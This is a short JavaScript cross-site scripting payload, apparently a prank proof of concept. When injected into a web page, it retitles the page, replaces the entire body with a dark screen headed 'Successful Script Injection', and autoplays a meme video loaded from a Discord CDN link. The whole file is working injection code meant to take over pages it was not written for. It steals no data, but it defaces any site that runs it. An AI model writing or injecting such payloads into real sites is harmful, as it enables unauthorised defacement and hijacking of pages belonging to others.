/*Start*/

runScript();
function runScript(){
    document.title = "Cross Site Scripting";
    document.body.style.backgroundColor = "#181818";
    document.body.innerHTML = /*HTML*/`
    <div style="display: flex; justify-content: center; align-items: center; overflow:hidden;">
        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
            <h1 style="color:white;">Successful Script Injection</h1>
            <video id="memeVideo" width="640" height="480" controls>
                <source src="https://cdn.discordapp.com/attachments/779939942394363944/1185578686339104910/if_the_code_works_1.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    `;
    setTimeout(playVideo, 3000);
}

function playVideo(){
    var vid = document.getElementById("memeVideo");
    vid.volume = 0.50;
    vid.play();
}

/*End*/